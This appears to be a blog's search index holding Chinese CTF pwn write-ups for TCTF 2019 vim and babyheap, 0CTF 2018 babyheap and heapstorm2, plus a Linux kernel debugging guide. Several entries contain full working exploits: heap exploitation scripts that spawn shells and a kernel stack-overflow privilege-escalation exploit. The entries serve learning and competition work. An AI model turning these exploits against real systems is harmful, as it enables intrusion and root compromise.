<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[TCTF 2019 vim]]></title>
    <url>%2F2019%2F04%2F04%2FTCTF-2019-vim%2F</url>
    <content type="text"><![CDATA[自定义的加解密方法存在漏洞。 0x00 源代码刨析key设置为恒为字符串a。 1234// to avoid interactive step, without loss of generalityp1 = alloc(8);p1[0] = 'a';p1[1] = NUL; cryptstate_T结构体： 12345678910/* The state of encryption, referenced by cryptstate_T. */typedef struct &#123; int key; int shift; int step; int orig_size; int size; int cur_idx; char_u *buffer;&#125; perm_state_T; init函数，其中主要做的是计算cryptstate_T结构体的key，可以在此函数下断点验证传入的key是否为”a”。 1234567891011121314151617181920crypt_perm_init( cryptstate_T *state, char_u *key, char_u *salt UNUSED, int salt_len UNUSED, char_u *seed UNUSED, int seed_len UNUSED)&#123; char_u *p; perm_state_T *ps; ps = (perm_state_T *)alloc(sizeof(perm_state_T)); ps-&gt;key = 0; state-&gt;method_state = ps; for (p = key; *p != NUL; ++p) &#123; ps-&gt;key = 131*ps-&gt;key + *p; &#125;&#125; 解密函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to)&#123; perm_state_T *ps = state-&gt;method_state; size_t i; if (len&lt;=4) &#123; for (i = 0; i &lt; len; ++i) to[i] = from[i]; return; &#125; unsigned int iv; for (i = 0; i &lt; 4; ++i) &#123; to[i] = from[i]; iv = (iv&lt;&lt;8) + from[i]; &#125; ps-&gt;orig_size = len-4; ps-&gt;size = ps-&gt;orig_size; while (!is_prime(ps-&gt;size)) ps-&gt;size++; ps-&gt;shift = ps-&gt;key % (len-4); if (ps-&gt;shift &gt; 0) ps-&gt;buffer = alloc(ps-&gt;shift); ps-&gt;step = ps-&gt;key ^ iv; if (ps-&gt;step % ps-&gt;size == 0) ps-&gt;step++; ps-&gt;cur_idx = 0; /* Step 1: Inverse of Multiplication */ i = 4; while (i &lt; len) &#123; if (ps-&gt;cur_idx &lt; ps-&gt;orig_size) &#123; to[ps-&gt;cur_idx+4] = from[i]; i++; &#125; ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size; &#125; /* Step 2: Inverse of Addition */ for (i = 0; i &lt; ps-&gt;shift; ++i) ps-&gt;buffer[i] = to[i+4]; for (i = 4+ps-&gt;shift; i &lt; len; ++i) to[i-ps-&gt;shift] = to[i]; for (i = 0; i &lt; ps-&gt;shift; ++i) to[len-ps-&gt;shift+i] = ps-&gt;buffer[i]; if (ps-&gt;shift &gt; 0) vim_free(ps-&gt;buffer);&#125; 需要知道IV在头文件中的位置，漏洞主要在步骤1中： 12345678910111213141516171819202122232425262728293031/* The state of encryption, referenced by cryptstate_T. */typedef struct &#123; int key; int shift; int step; int orig_size; int size; int cur_idx; char_u *buffer;&#125; perm_state_T;crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to)&#123; // ... /* Step 1: Inverse of Multiplication */ i = 4; while (i &lt; len) &#123; if (ps-&gt;cur_idx &lt; ps-&gt;orig_size) &#123; to[ps-&gt;cur_idx+4] = from[i]; i++; &#125; ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size; &#125; // ...&#125; 这里没有检查ps-&gt;cur_idx的值，导致可以控制其为负数，造成堆的前向溢出。 from是vim打开的文件。ps-&gt;step可以通过 1234567891011unsigned int iv;for (i = 0; i &lt; 4; ++i)&#123; to[i] = from[i]; iv = (iv&lt;&lt;8) + from[i];&#125;// ...ps-&gt;step = ps-&gt;key ^ iv;if (ps-&gt;step % ps-&gt;size == 0) ps-&gt;step++;ps-&gt;cur_idx = 0; 控制。 如果能改写ps-&gt;buffer的值，就能进一步利用 123/* Step 2: Inverse of Addition */for (i = 0; i &lt; ps-&gt;shift; ++i) ps-&gt;buffer[i] = to[i+4]; 达到任意地址写的目的。 0x01 Debug it生成脚本： 12345678910111213141516def main(): payload = 'VimCrypt~04!' payload += 'aaaa' payload += 'bbbb' payload += 'cccc' payload += 'dddd' payload += 'eeee' payload += 'ffff' payload += 'gggg' payload += 'hhhh' with open('exp', 'wb') as f: f.write(payload)if __name__ == '__main__': main() 设置参数和断点： crypt_perm_init()断点： 12345678910111213141516crypt_perm_init( cryptstate_T *state, char_u *key, char_u *salt UNUSED, int salt_len UNUSED, char_u *seed UNUSED, int seed_len UNUSED)&#123; // ... ps-&gt;key = 0; // ... for (p = key; *p != NUL; ++p) &#123; ps-&gt;key = 131*ps-&gt;key + *p; &#125;&#125; 可以发现RSI指向的key为字符串”aNUL”，因此ps-&gt;key的值为0x61。 12345crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to) 通过调试可以发现from（图中的rsi指向的数据）即为去除maigc的剩余部分输入内容，也就是说IV即输入文件除去魔术数的前四字节。 123456unsigned int iv;for (i = 0; i &lt; 4; ++i)&#123; to[i] = from[i]; iv = (iv&lt;&lt;8) + from[i];&#125; 为了让ps-&gt;step为-1，ps-&gt;key就要为-1^iv。 1ps-&gt;step = ps-&gt;key ^ iv; 由上图可以知道rax的值为0x900000即ps变量，rcx的值为0x900030即to参数。它们紧挨在一起，使得to的向前溢出能够覆盖ps变量，从而达到改写ps-&gt;buffer的目的。 1234567891011121314151617181920212223242526272829303132333435/* The state of encryption, referenced by cryptstate_T. */typedef struct &#123; int key; int shift; int step; int orig_size; int size; int cur_idx; char_u *buffer;&#125; perm_state_T;crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to)&#123; // ... /* Step 1: Inverse of Multiplication */ i = 4; while (i &lt; len) &#123; if (ps-&gt;cur_idx &lt; ps-&gt;orig_size) &#123; to[ps-&gt;cur_idx+4] = from[i]; i++; &#125; ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size; &#125; // ... /* Step 2: Inverse of Addition */ for (i = 0; i &lt; ps-&gt;shift; ++i) ps-&gt;buffer[i] = to[i+4]; // ...&#125; 但是代码从to[i+4]处开始获得数据写入ps-&gt;buffer，因此需要想办法向to[i+4]之后的地址写入数据。 观察到，ps-&gt;cur_idx是可以被覆盖最高字节的，且在计算的时候会模上from的长度，所以覆盖高字节后，ps-&gt;cur_idx是一个很大的正数，通过求模可将写入to的位置移动到正向方向来进行回写。 0x02 Pwn it在程序中，有一处执行shell的地方： 可以执行rax/rcx的所指向的命令。 crypt_perm_decode()在最后执行了vim_free(ps-&gt;buffer)，而在vim_free()中，call free的时候，rax正是保存了ps-&gt;buffer的地址，因此在修改free@got的同时通过向ps-&gt;buffer写入cat flag即可获取flag。 exp生成脚本如下： 1234567891011121314151617181920212223from pwn import *import structdef main(): elf = ELF('./vim') payload = 'VimCrypt~04!' payload += struct.pack("&gt;i", -1 ^ 0x61) # iv payload += 'aaaaa' payload += p64(0x61)[::-1] payload += 'cccccccc' payload += p64(elf.got['free'] - 4 - 8)[::-1] payload += 'bbbbbbbb' payload += 'cccccc\x00\x00' payload += '\x00\x00\x00\x4c\x91\x63\x00\x00' payload += '\x00\x00galf t' payload += 'ac'.ljust(8, '\x00') with open('exp', 'wb') as f: f.write(payload)if __name__ == '__main__': main()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>tctf</tag>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Learn Address Sanitizer with TCTF 2019 babyaegis]]></title>
    <url>%2F2019%2F03%2F27%2FLearn-Address-Sanitizer-with-TCTF-2019-babyaegis%2F</url>
    <content type="text"><![CDATA[比较有趣又能学到新知识的一题。 【施工中】]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2019</tag>
        <tag>tctf</tag>
        <tag>asan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCTF 2019 babyheap]]></title>
    <url>%2F2019%2F03%2F27%2FTCTF-2019-babyheap%2F</url>
    <content type="text"><![CDATA[程序中的唯一漏洞就是在写入数据时发生了off-by-null。 程序中使用calloc函数作为分配堆块的函数，需要注意该函数不使用tcache，直接调用_int_malloc。 1234567891011121314void *__libc_calloc (size_t n, size_t elem_size)&#123; mstate av; mchunkptr oldtop, p; INTERNAL_SIZE_T bytes, sz, csz, oldtopsize; void *mem; unsigned long clearsize; unsigned long nclears; INTERNAL_SIZE_T *d; // ... mem = _int_malloc (av, sz); // ...&#125; 一开始注意到程序分配了很大一块无用的堆块： 123if ( mmap(addr, 0x1000uLL, 3, 34, -1, 0LL) != addr ) exit(-1);malloc(0x1F000uLL); 这使得top chunk变得非常小了。因此就想到了通过耗尽top chunk来拿到unsorted bin的做法。 第一步先将需要用到的对应大小的fastbin对应的tcache填满，以获得fastbin，并且在分配的过程中不断向top chunk的size溢出\x00以更快的消耗其剩余大小。 在其中适当的位置释放空间连续的fastbin，当top chunk的剩余大小不足以满足分配申请时，将会调用malloc_consolidate函数对fastbin中的空闲chunk进行合并，并放入small bin中，由于申请了空间，small bin被分割后放入unsorted bin。利用常规的off by null和堆块重叠来泄漏地址并供后续fastbin attack。 在进行fastbin attack时，将fd指针指到main_arena中，先把top chunk指到堆的起始位置，即tcache entry处，获取该处内存以用来不断清空tcache计数。随后将top chunk指到stdout附近，通过不断申请、释放、清空tcache计数（避免chunk被放入fastbin而无法使用top chunk）的方法消耗top chunk使其移动到__free_hook附近，并将其改写成one_gadget，通过触发free来getshell。 exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190from pwn import *def add(p, size): p.sendlineafter('Command: ', str(1)) p.sendlineafter('Size: ', str(size)) def update(p, idx, size, content): p.sendlineafter('Command: ', str(2)) p.sendlineafter('Index: ', str(idx)) p.sendlineafter('Size: ', str(size)) p.sendafter('Content: ', content)def delete(p, idx): p.sendlineafter('Command: ', str(3)) p.sendlineafter('Index: ', str(idx))def view(p, idx): p.sendlineafter('Command: ', str(4)) p.sendlineafter('Index: ', str(idx))def pwn(): #p = process('./babyheap') p = remote('111.186.63.20', 10001) elf = ELF('./babyheap') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] for i in range(7): add(p, 0x28) update(p, i, 0x28, 'a' * 0x28) for i in range(7): delete(p, i) for i in range(7): add(p, 0x38) update(p, i, 0x38, 'a' * 0x38) for i in range(7): delete(p, i) for i in range(8): add(p, 0x48) update(p, i, 0x48, 'a' * 0x48) for i in range(7): delete(p, i) # 7 for i in range(4): # 0 ~ 3 add(p, 0x38) update(p, i, 0x38, 'a' * 0x38) add(p, 0x38) # 4 payload = p64(0) * 4 + p64(0x100) + p64(0x60) + p64(0) update(p, 4, 0x38, payload) add(p, 0x48) # 5 update(p, 5, 0x48, 'a' * 0x48) add(p, 0x38) # 6 update(p, 6, 0x38, 'a' * 0x38) for i in range(5): # 0 ~ 4 delete(p, i) add(p, 0x58) # 0 add(p, 0x58) # 1 add(p, 0x28) # 2 update(p, 2, 0x28, 'a' * 0x28) delete(p, 5) add(p, 0x38) # 3 add(p, 0x38) # 4 add(p, 0x38) # 5 add(p, 0x38) # 8 delete(p, 3) delete(p, 4) add(p, 0x28) # 3 add(p, 0x48) # 4 view(p, 5) p.recvuntil('[5]: ') recv = p.recv(6) + '\x00\x00' libc.address = u64(recv) - (0x7f8b3cdeaca0 - 0x00007f8b3cc06000) add(p, 0x48) # 9 target_address = libc.address + (0x7fd5d1e8bc55 - 0x7fd5d1ca7000) # 5 - 9 is same delete(p, 4) #4 delete(p, 9) #9 delete(p, 2) #2 view(p, 5) p.recvuntil('[5]: ') recv = p.recv(6) + '\x00\x00' heap_address = u64(recv) print hex(target_address) update(p, 5, 0x8, p64(target_address)) add(p, 0x48) # 2 - 5 is same add(p, 0x48) # 4 tcache_entry = heap_address - (0x563db82df850 - 0x563db82c0000) payload = '\x00\x00\x00' + p64(0) * 7 + p64(tcache_entry) update(p, 4, len(payload), payload) add(p, 0x58) # 9 add(p, 0x28) # 10 add(p, 0x28) # 11 add(p, 0x28) # 12 update(p, 12, 0x28, '\x00' * 0x28) delete(p, 10) delete(p, 11) delete(p, 9) payload = '\x00\x00\x00' + p64(0) * 7 + p64(libc.address + 0x7ffff7fc3850 - 0x00007ffff7dde000) update(p, 4, len(payload), payload) count = [9, 10, 11, 13, 14, 15] for i in range(6): add(p, 0x58) # 9 for i in range(6): delete(p, count[i]) update(p, 12, 0x28, '\x00' * 0x28) for j in range(6): for i in range(6): add(p, 0x58) # 9 for i in range(6): delete(p, count[i]) update(p, 12, 0x28, '\x00' * 0x28) add(p, 0x58) # 9 update(p, 9, 8, 'sunichi') add(p, 0x58) # 10 add(p, 0x58) # 11 payload = p64(0) + p64(libc.address + 0x103f50) update(p, 11, len(payload), payload) print hex(heap_address) print hex(libc.address) print hex(target_address) #get shell delete(p, 9) #gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn()'''0x50186 execve("/bin/sh", rsp+0x40, environ)constraints: rcx == NULL0x501e3 execve("/bin/sh", rsp+0x40, environ)constraints: [rsp+0x40] == NULL0x501ef execve("/bin/sh", rsi, [rax])constraints: [rsi] == NULL || rsi == NULL [[rax]] == NULL || [rax] == NULL0xdf39f execve("/bin/sh", rcx, [rbp-0x70])constraints: [rcx] == NULL || rcx == NULL [[rbp-0x70]] == NULL || [rbp-0x70] == NULL0xdf3a3 execve("/bin/sh", rcx, rdx)constraints: [rcx] == NULL || rcx == NULL [rdx] == NULL || rdx == NULL0xdf3a6 execve("/bin/sh", rsi, rdx)constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL0x103f50 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''']]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2019</tag>
        <tag>tctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 Mar pwn writeup]]></title>
    <url>%2F2019%2F03%2F12%2F19-Mar%2F</url>
    <content type="text"><![CDATA[0CTF Quals 2018 babyheap [2019.03.12]一道挺有趣的fast bin做法的题。 漏洞为off-by-one。一开始想利用FSOP来getshell，但是由于程序申请的chunk的大小的限制，无法将chunk从unsorted bin放入smallbin[4]。 由于程序允许的chunk大小范围时0x20-0x50，因此可以利用堆地址的0x55/0x56来获取main_arena处的空间，进而修改top_chunk指针到malloc_hook附近劫持malloc_hook。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697# coding=utf-8from pwn import *def add(p, size): p.sendlineafter('Command: ', str(1)) p.sendlineafter('Size: ', str(size))def update(p, idx, content, attack=0, size=0): p.sendlineafter('Command: ', str(2)) p.sendlineafter('Index: ', str(idx)) if attack == 0: p.sendlineafter('Size: ', str(len(content))) else: p.sendlineafter('Size: ', str(size)) p.sendafter('Content: ', content)def delete(p, idx): p.sendlineafter('Command: ', str(3)) p.sendlineafter('Index: ', str(idx))def view(p, idx): p.sendlineafter('Command: ', str(4)) p.sendlineafter('Index: ', str(idx))def pwn(): BIN_PATH = './program' DEBUG = 1 local = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': if local == 1: libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('./libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') add(p, 0x28) #0 add(p, 0x58) #1 add(p, 0x48) #2 update(p, 0, '\x00' * 0x28 + '\x91', 1, 0x29) update(p, 2, p64(0) * 5 + p64(0x21)) delete(p, 1) add(p, 0x58) #1 view(p, 2) p.recvuntil('k[2]: ') recv = p.recv(8) libc.address = u64(recv) - (0x7f4675a13b78 - 0x00007f467564f000) log.info('libc:%s' % hex(libc.address)) update(p, 2, recv * 2 + p64(0) * 2 + p64(0x30) + p64(0x21)) update(p, 0, '\x00' * 0x28 + '\x91', 1, 0x29) delete(p, 1) view(p, 2) p.recvuntil('k[2]: ') p.recv(8) heap = p.recv(8) heap_addr = u64(heap) - 0x60 log.info('heap base:%s' % hex(heap_addr)) # clear the heap add(p, 0x28) #1 update(p, 2, p64(0) * 4 + p64(0x90) + p64(0x20)) add(p, 0x58) #3 add(p, 0x28) #4 update(p, 3, '\x00' * 0x58 + '\x51', 1, 0x59) # chunk overlap to fast bin attack delete(p, 2) delete(p, 0) update(p, 4, p64(libc.address + (0x7f7aaf721b2d - 0x00007f7aaf35d000))) add(p, 0x48) #0 add(p, 0x48) #2 main_arena payload = '\x00\x00\x00' + p64(0) * 7 + p64(libc.symbols['__malloc_hook'] - 0x23) update(p, 2, payload) add(p, 0x38) payload = '\x00\x00\x00' + p64(0) + p64(0) + p64(libc.address + 0xf02a4) update(p, 5, payload) # getshell delete(p, 1) delete(p, 4)# gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn() BSidesSF CTF 2019 straw_clutcher [2019.03.17]]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Learn Large Bin With 0ctf2018 Heapstorm2]]></title>
    <url>%2F2019%2F03%2F11%2FLearn-LargeBin-With-Heapstorm2%2F</url>
    <content type="text"><![CDATA[Large Bin基本结构Large Bin的每个Bin中的chunk的大小都属于同一范围，Large Bin的每个chunk位于两个双向链表中。相比较其它chunk，Large Bin中的chunk多出了fd_nextsize和bk_nextsize两个字段，分别指向前一个/后一个与当前chunk大小相邻的不同大小的第一个空闲块（不包括bin头指针）。 Put Unsorted Bin into Large Bin在malloc时，如果Unsorted Bin中的victim的大小无法满足申请所需且属于Large Bin，将会被置入Large Bin中。 123456789101112131415161718192021222324252627victim_index = largebin_index(size); // 计算bin数组下标bck = bin_at(av, victim_index); // 获取binfwd = bck-&gt;fd; // bin中第一个chunkif (fwd != bck) &#123; // 更新大小排序链表 // ... if (size &lt; bck-&gt;bk-&gt;size) &#123; // 如果大小小于bin中最小的chunk大小 fwd = bck; // bin bck = bck-&gt;bk; // 最后一个chunk // 在bin和bck中插入 victim-&gt;fd_nextsize = fwd-&gt;fd; // 写入fd_nextsize victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; // 写入bk_nextsize fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize; // 更新fwd-&gt;fd的bk_nextsize &#125; else &#123; // ... &#125;&#125; else &#123; // ...&#125;mark_bin(av, victim_index);// 更新普通链表victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim; 从源码中可以看出，Large Bin在更新链表的时候，没有freed chunk中的链表数据的进行任何的安全检查，利用这一点，可以向指定地址写入堆地址数据。利用对齐的特性向堆上写入0x56开头的堆地址，则可以在特定位置制造一个空闲的0x56大小的chunk。当申请0x48大小的chunk时（并触发unsorted bin一系列操作后），特定位置的chunk将会被取出。 0x55与0x5664位下，PIE和randomize_va_space对地址的影响： 0表示关闭地址空间随机化 1表示对mmap的基地址、栈地址和vdso地址随机化 2表示在1的基础上对堆地址随机化 当程序开启PIE且系统支持地址随机化时，堆地址的非零最高位会在0x55和0x56之间随机。这两个数字对于calloc()来说，只有0x56能够通过检查。 12assert (!mem || chunk_is_mmapped (mem2chunk (mem)) || av == arena_for_chunk (mem2chunk (mem))); 0ctf2018 heapstorm2明显的off-by-null漏洞。 12345input_string(chunk, size);remainder_space = size + chunk;*(_QWORD *)remainder_space = 'ROTSPAEH';*(_DWORD *)(remainder_space + 8) = 'II_M';*(_BYTE *)(remainder_space + 0xC) = 0; // off by null 利用off-by-null来制造堆块重叠，从而修改已释放的chunk的链表指针数据。通过将Unsorted Bin中的Large Chunk放入Large Bin的操作，向特定地址写入0x56开头的堆地址，使得再次申请chunk时，获得特定地址的chunk，从而改写关键数据以进一步getshell。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>0ctf</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Debug Linux Kernel With QEMU/KVM]]></title>
    <url>%2F2019%2F02%2F13%2FDebug-Linux-Kernel-With-QEMU-KVM%2F</url>
    <content type="text"><![CDATA[之前师兄给我看过一个双Ubuntu on VMware Workstation的Linux Kernel调试解决方案，但是在Mac下配起来比Win上困难好多，因此就使用CentOS on VMware Fusion + QEMU/KVM的方案来搭建Linux Kernel（用目标内核替换发行版Linux的内核）调试环境。后来又改进成直接在VM中使用QEMU直接启动Linux Kernel来调试。 使用虚拟机源码调试Linux Kernel实验环境： 123宿主：macOS Mojave + VMware Fusion 11 Pro虚拟机：CentOS 7.6.1810 64 bit被调试机：CentOS 6.10 64 bit 虚拟机配置建议分配50G以上的硬盘空间。在设置中需要打开在此虚拟机中启用虚拟化管理程序选项以让虚拟机提供Intel VT-x/EPT支持。使用CentOS的Live版本的iso进行安装，选择”Test Then Start”的选项启动系统避免发生错误。 能够正常打开系统后，选择安装到硬盘即可。 QEMU/KVM环境配置在虚拟机中安装QEMU/KVM和VIRT环境： 1yum install qemu-kvm qemu-system virt-manager libvirt libvirt-python libvirt-client virt-install virt-viewer 启动libvirtd 1service libvirtd start 在启动virt-manager时，如果遇到权限问题，则修改/etc/libvirt/qemu.conf，添加下述内容并重启服务。 12user = "root" group = "root" 下载所要调试的内核的载体操作系统，并将iso文件放到libvirt的images目录下。通过virt-manager创建KVM，硬盘空间建议设置为25G以上。在进行到最后一步时勾选启动前进行配置。在设置面板的CPU选项中，将复制CPU参数选中然后再开始进行安装。 经上述步骤后，KVM启动，使用 12virsh listvirsh edit 来修改配置，将第一行改为 1&lt;domain type='kvm' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'&gt; 在&lt;/device&gt;后加入 12345&lt;qemu:commandline&gt; &lt;qemu:arg value='-S'/&gt; &lt;qemu:arg value='-gdb'/&gt; &lt;qemu:arg value='tcp::1234'/&gt; &lt;/qemu:commandline&gt; 当KVM被重启后，将会在localhost开启1234端口进行gdb的监听。 在被调试机中编译和使用其他版本Linux内核在QEMU/KVM中安装 1yum install gcc ncurses-devel 从kernel.org上下载3.18.35源码，修改Makefile文件的617行的KBUILD_CFLAGS值为O1，进行编译 1234make menuconfigmakemake modules_installmake install 在make install后，会报一些could not find module的错误，忽略之。查看当前已有的内核版本 1cat /boot/grub/grub.conf | awk '$1=="title" &#123;print i++ " :" $NF&#125;' 修改当前默认启动的内核版本后，重启即可。 123vi /boot/grub/grub.confdefault = 0reboot 调试Linux内核由于之前已经设置好了参数，在被调试机启动后将会开启1234端口作为gdb的调试端口，将编译好的vmlinux保存到虚拟机中，启动gdb进行调试。 123scp root@kvm_ip:/path/to/vmlinux ./gdb vmlinuxtarget remote localhost:1234 使用QEMU源码调试Linux Kernel实验环境： 12宿主：macOS Mojave + VMware Fusion 11 Pro + Ubuntu 16.04.6 被调试机：Linux Kernel 2.6.32.29 编译Linux内核由于所需要编译的Linux版本较低，因此需要将gcc切换成gcc 4.8后再编译。 123sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-x xsudo update-alternatives --config gccmake 编译busybox一开始在Ubuntu 18.04上静态编译的时候，遇到libc版本的问题，在Linux Kernel启动的时候会提示kernel too old。在编译前需要使用以下指令检查下当前libc所支持的内核版本，如果所支持的版本过高，需要使用低版本libc。 1file /path/to/libc-x.xx.so 需要将busybox的编译选项设置为静态编译。 123make menuconfigmakemake install 把生成的_install文件夹拷贝到linux kernel源代码根目录。 生成文件系统进入_install目录，创建文件夹 12345678mkdir etcmkdir devmkdir mntmkdir -p etc/init.d/mkdir homemkdir roottouch etc/passwdtouch etc/group 创建etc/init.d/rcS文件 123456789mkdir -p /procmkdir -p /tmpmkdir -p /sysmkdir -p /mnt/bin/mount -amkdir -p /dev/ptsmount -t devpts devpts /dev/ptsecho /sbin/mdev &gt; /proc/sys/kernel/hotplugmdev -s 1chmod +x rcS 创建etc/fstab文件 1234proc /proc proc defaults 0 0tmpfs /tmp tmpfs defaults 0 0sysfs /sys sysfs defaults 0 0tmpfs /dev tmpfs defaults 0 0 创建etc/inittab文件 1234::sysinit:/etc/init.d/rcS::respawn:-/bin/sh::askfirst:-/bin/sh::ctrlaltdel:/bin/umount -a -r 在dev/创建设备节点 12sudo mknod console c 5 1sudo mknod null c 1 3 创建文件系统，在_install文件夹中执行 1find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.img QEMU启动Linux Kernel1qemu-system-x86_64 -kernel /path/to/bzImage -initrd /path/to/initramfs.img -m 200M -append "rdinit=/linuxrc" GDB Patch使用gdb调试的时候，会出现g pack too long的报错，可通过网上的方法解决（修改gdb源码并重新编译），虽然能够正常调试，但首次attach上无法正常显示pwngdb等插件的界面，退出再重新attach即可（QEMU使用选项-S和-s）。 编译特定内核版本的驱动在Makefile中指定根目录即可 1ROOTDIR := /path/to/kernel/source 在系统中加载驱动后，会被挂载在sys目录下而不是dev目录。 基本内核栈溢出漏洞调试简单内核栈溢出示例使用 1qemu-system-x86_64 -kernel /path/to/bzImage -initrd /path/to/initramfs.img -m 200M -append "rdinit=/linuxrc" -S -s 启动内核并使用gdb进行调试。 示例驱动源代码： 123456789101112131415161718192021222324252627282930313233343536#include &lt;linux/kernel.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/proc_fs.h&gt;#include &lt;linux/string.h&gt;#include &lt;linux/vmalloc.h&gt;#include &lt;linux/sched.h&gt;#include &lt;linux/uaccess.h&gt;struct proc_dir_entry *proc_file_entry;uint64_t rbx, rbp;// Buggy write handlingint buggy_write(struct file *file, const char *buf, unsigned long len) &#123; char data[8]; copy_from_user(data, buf, len); return len;&#125;static struct file_operations buggy_proc_fops = &#123; .write = buggy_write,&#125;;int init_module() &#123; printk(" module started\n"); printk(" creating proc entry @ /proc/buggy\n"); proc_file_entry = proc_create("buggy", 0666, NULL, &amp;buggy_proc_fops); return 0;&#125;void cleanup_module() &#123; remove_proc_entry("buggy", NULL);&#125; Makefile： 1234567891011obj-m := sbof.oROOTDIR := /path/to/linux/srcPWD := $(shell pwd)default: $(MAKE) -C $(ROOTDIR) M=$(PWD) modules $(CC) --static -o exploit exploit.cclean: $(MAKE) -C $(ROOTDIR) M=$(PWD) clean rm exploit exploit.c： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/user.h&gt;#define STACK_SIZE (1024 * 1024)char ownstack[STACK_SIZE];struct fake_frame &#123; void *rip; /* shell() */ uint64_t cs; /* %cs */ uint64_t rflags; /* rflags */ void *rsp; /* %rsp */ uint64_t ss; /* %ss */&#125; __attribute__( (packed) ) ff;#define KERNCALL __attribute__( (regparm( 3 ) ) )void * (*prepare_kernel_cred)(void *) KERNCALL = (void *) 0xffffffff8105d4e9;void * (*commit_creds)(void *) KERNCALL = (void *) 0xffffffff8105d5c7;void shell( void )&#123; execl( "/bin/sh", "sh", 0 );&#125;void payload( void )&#123; commit_creds( prepare_kernel_cred( 0 ) ); asm ("mov $ff, %rsp;\n" "swapgs;\n" "iretq;");&#125;void setup_ff( void )&#123; asm ("xorq %rax, %rax;\n" "movw %cs, %ax;\n" "movq %rax, ff+8;\n" "pushfq; popq ff+16;\n" "movw %ss, %ax;\n" "movq %rax, ff+32;\n"); ff.rip = &amp;shell; ff.rsp = ownstack + (STACK_SIZE / 2);&#125;int main()&#123; FILE *fd; char buf[8 * 6]; memset( buf, 'A', sizeof(buf) ); *( (void * *) (buf + 8 * 4) ) = &amp;payload; int ret = 0; unsigned long addr; char dummy; char sname[512]; /* setup fake frame */ fprintf( stdout, "[+] preparing fake frame" ); setup_ff(); /* write payload */ fprintf( stdout, "[+] writing payload to /proc/buggy" ); fd = fopen( "/proc/buggy", "w" ); if ( fd == NULL ) &#123; perror( "fopen()" ); return(-1); &#125; fwrite( buf, sizeof(buf), 1, fd ); fclose( fd ); return(0);&#125; 编译完驱动和exploit后重新打包文件系统并启动Kernel。安装模块后，使用 1cat /sys/modules/sbof/section/.text 查看模块代码段地址，并在gdb中 12gdb-peda$ add-symbols-file sbof.ko &lt;内存位置&gt;gdb-peda$ b &lt;内存位置&gt; 获取commit_creds和prepare_kernel_cred函数的内存地址： 12grep commit_creds /sys/kallsymsgrep prepare_kernel_cred /sys/kallsyms 执行exploit之前最好切换到非root用户，执行exploit后获取root权限。 gadget搜索在性能良好的主机上使用Ropper： 1ropper --file ./vmlinux --nocolor &gt; g1 Ubuntu 64位下编译32位程序内核1make ARCH=i386 Busybox修改编译选项 12(-m32 -march=i386) Additional CFLAGS(-m32) Additional LDFLAGS 驱动1export CFLAGS="-m32" 参考文章和资料 http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2016/06/21/gdb-linux-kernel-by-qemu https://www.ibm.com/developerworks/cn/linux/1508_zhangdw_gdb/index.html http://sec-redclub.com/archives/636/ 《奔跑吧，Linux内核 入门篇》]]></content>
      <tags>
        <tag>linux</tag>
        <tag>pwn</tag>
        <tag>kernel</tag>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
